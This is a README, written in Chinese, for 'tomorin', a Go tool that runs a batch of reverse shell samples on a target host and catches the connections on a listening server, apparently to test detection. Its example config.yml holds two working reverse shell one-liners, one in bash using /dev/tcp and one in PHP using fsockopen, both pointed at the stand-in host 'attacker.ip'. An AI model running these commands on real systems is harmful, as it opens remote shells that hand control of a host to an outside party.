# tomorin 批量执行反弹 Shell 样本

## Build

```bash
go build -o ./bin/tomorin
```

## Usage

### Listening host 

在作为server的主机上执行 `./tomorin serve` 监听连接。当有外部主机连接上的时候，会发送一个命令。默认是 `whoami` 而且执行会 exit。

```
ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin serve -h
Run reverse shell server

Usage:
  tomorin serve [flags]

Flags:
  -a, --address strings   Addresses to listen, each of which has the format of [PROTO:[IP:]]PORT. If PROTO is not specified, then "tcp" will be used. If IP is not specified, then "udp" will be used.
      --cmd string        Command to be executed once a remove host is connected (default "whoami && sleep 2")
      --cmd-exit          Whether to append an "exit" to the end of the provided cmd. This should always be true if you want a graceful exit on the remote shell. (default true)
  -h, --help              help for serve
      --tcp-timeout int   Timeout for each connection. Applied to TCP only (default 10)
```

监听 TCP 29007 和 UDP 29008 端口

```bash
./bin/tomorin serve -a tcp:29007 -a udp:29008
```

### Target host

`./tomorin run` 在目标主机上通过创建pty来执行反弹Shell。

```
ubuntu@VM-0-5-ubuntu:~/source/tomorin$ ./bin/tomorin run -h
Run reverse shell samples from current host

Usage:
  tomorin run [flags]

Flags:
  -c, --config string   Path to the config file (default "config.yml")
  -h, --help            help for run
      --timeout int     Timeout of each sample (default 10)
      --wait int        Timeout until the next sample (default 7)
```

编写 `config.yml`，把反弹Shell样本写入 `samples` 字段，把依赖项写入 `depends` 字段，比如

```yaml
depends:
- php
samples:
- name: 001
  script: bash -i >& /dev/tcp/attacker.ip/4242 0>&1
- name: 002
  script: php -r '$sock=fsockopen("attacker.ip",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```

确认所有依赖都无误之后，执行所有反弹Shell样本

```bash
./bin/tomorin run -c config.yml
```

## TODO

- [x] Reverse shell server
    - [x] TCP
    - [x] UDP
- [x] Execute in pty
- [ ] Execute in `exec.Command`
- [ ] Check dependencies
